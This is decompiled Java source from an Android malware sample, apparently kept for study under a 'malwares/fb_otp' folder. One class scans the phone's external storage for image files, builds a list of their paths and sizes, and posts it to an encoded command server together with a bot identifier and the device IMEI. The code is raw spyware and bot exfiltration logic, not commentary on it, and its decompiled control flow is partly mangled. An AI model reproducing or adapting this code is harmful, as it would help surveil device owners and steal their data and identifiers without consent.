import android.content.Context;
import android.os.Environment;
import com.soft360.iService.AService;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class ee
{
  ArrayList jdField_a_of_type_JavaUtilArrayList = new ArrayList();
  String[] jdField_a_of_type_ArrayOfJavaLangString = { ".jpg", ".jpeg", ".gif", ".png" };
  
  public ee(dU paramdU)
  {
    a(new File(Environment.getExternalStorageDirectory().getAbsolutePath()));
    int j = 0;
    int i = 0;
    paramdU = "";
    if (j >= this.jdField_a_of_type_JavaUtilArrayList.size())
    {
      a(paramdU, i);
      return;
    }
    paramdU = paramdU + (String)this.jdField_a_of_type_JavaUtilArrayList.get(j) + "\n";
    if (j % 99 == 0)
    {
      a(paramdU, i);
      i += 1;
    }
    for (;;)
    {
      j += 1;
      break;
    }
  }
  
  private void a(File paramFile)
  {
    File[] arrayOfFile = paramFile.listFiles();
    int i;
    if (arrayOfFile != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= arrayOfFile.length) {
        return;
      }
      if (!arrayOfFile[i].isDirectory()) {
        break;
      }
      a(arrayOfFile[i]);
      i += 1;
    }
    String str = arrayOfFile[i].getName();
    int j = this.jdField_a_of_type_ArrayOfJavaLangString.length - 1;
    for (;;)
    {
      if (j < 0) {}
      for (j = 0;; j = 1)
      {
        if (j == 0) {
          break label190;
        }
        new StringBuilder().append(paramFile).append("/").append(arrayOfFile[i].getName()).append("|").append(arrayOfFile[i].length()).toString();
        this.jdField_a_of_type_JavaUtilArrayList.add(paramFile + "/" + arrayOfFile[i].getName() + "|||" + arrayOfFile[i].length());
        break;
        if (!str.endsWith(this.jdField_a_of_type_ArrayOfJavaLangString[j])) {
          break label192;
        }
      }
      label190:
      break;
      label192:
      j -= 1;
    }
  }
  
  private void a(String paramString, int paramInt)
  {
    DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
    localDefaultHttpClient.getParams().setParameter("http.protocol.content-charset", "UTF-8");
    Object localObject1 = AService.jdField_a_of_type_AndroidContentContext.getString(2131165194);
    try
    {
      localObject2 = this.jdField_a_of_type_DU.a;
      localObject2 = new String(cD.a((String)localObject1));
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          Object localObject2 = new ArrayList();
          ((List)localObject2).add(new BasicNameValuePair("photo_list", paramString));
          ((List)localObject2).add(new BasicNameValuePair("pages", paramInt));
          ((List)localObject2).add(new BasicNameValuePair("bot_id", this.jdField_a_of_type_DU.b()));
          paramString = this.jdField_a_of_type_DU;
          ((List)localObject2).add(new BasicNameValuePair("imei", dU.a()));
          ((HttpPost)localObject1).setEntity(new UrlEncodedFormEntity((List)localObject2, "UTF-8"));
          localDefaultHttpClient.execute((HttpUriRequest)localObject1);
          return;
        }
        catch (IOException paramString)
        {
          paramString.printStackTrace();
          return;
        }
        catch (ClientProtocolException paramString) {}
        localException = localException;
        localException.printStackTrace();
      }
    }
    localObject1 = new HttpPost(this.jdField_a_of_type_DU.a(AService.jdField_a_of_type_Int) + (String)localObject1);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/ee.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */